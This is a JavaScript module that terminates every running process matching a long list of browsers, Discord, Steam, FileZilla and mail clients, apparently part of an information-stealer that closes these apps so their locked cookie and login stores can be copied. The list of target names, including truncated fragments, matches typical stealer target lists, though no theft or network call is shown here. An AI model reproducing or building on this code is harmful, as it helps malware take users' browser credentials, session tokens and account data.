const {
    filterProcesses
} = require("./../../../utils/harware/processes.js");

const allProcess = [
    "discord",
    "cord",
    "Waterfox",
    "mullvad",
    "firefox",
    "chrome",
    "mozilla",
    "vivaldi",
    "Opera",
    "OperaGX",
    "EpicPrivacy",
    "ChromeSxS",
    "Sputnik",
    "7Star",
    "CentBrowser",
    "Orbitum",
    "Amigo",
    "Torch",
    "Kometa",
    "steam",
    "filezilla",
    "brave",
    "BraveSoftware",
    "brave.exe",
    "msedge",
    "edge",
    "Uran",
    "KMelon",
    "Maxthon3",
    "iebao",
    "oowon",
    "leipnir5",
    "hromePlus",
    "uperbird",
    "afotech",
    "aferTechnologies",
    "uhba",
    "orBrowser",
    "lementsBrowser",
    "ocCoc",
    "oBrowser",
    "IP Surf",
    "Atom",
    "liebao",
    "Coowon",
    "Sleipnir5",
    "ChromePlus",
    "Superbird",
    "Rafotech",
    "SaferTechnologies",
    "Suhba",
    "TorBrowser",
    "ElementsBrowser",
    "CocCoc",
    "GoBrowser",
    "QIP Surf",
    "RockMelt",
    "Nichrome",
    "Bromium",
    "Comodo",
    "Xpom",
    "Chedot",
    "360Browser",
    "Kmelon",
    "PaleMoon",
    "IceDragon",
    "BlackHaw",
    "Cyberfox",
    "Thunderbird",
    "SeaMonkey",
    "Firefox",
    "ockMelt",
    "ichrome",
    "romium",
    "omodo",
    "pom",
    "hedot",
    "60Browser",
];

const killProcess = (pid) => new Promise((resolve, reject) => {
    try {
        process.kill(pid);
        resolve();
    } catch (err) {
        reject(err);
    }
});

module.exports = async () => {
    try {
        const tasks = allProcess.map(async (processName) => {
            try {
                const filters = await filterProcesses(processName);
                
                if (filters.length > 0) {
                    const maxConcurrent = 5;
                    let index = 0;

                    const runConcurrent = async () => {
                        const batch = filters.slice(index, index + maxConcurrent);
                        index += maxConcurrent;
                        await Promise.all(batch.map(proc => killProcess(proc.pid)));
                    };

                    while (index < filters.length) {
                        await runConcurrent();
                    }
                }
            } catch (err) {
                console.error(`Error processing ${processName}:`, err);
            }
        });
        await Promise.all(tasks);
    } catch (error) {
        console.error(error.message);
    }
};
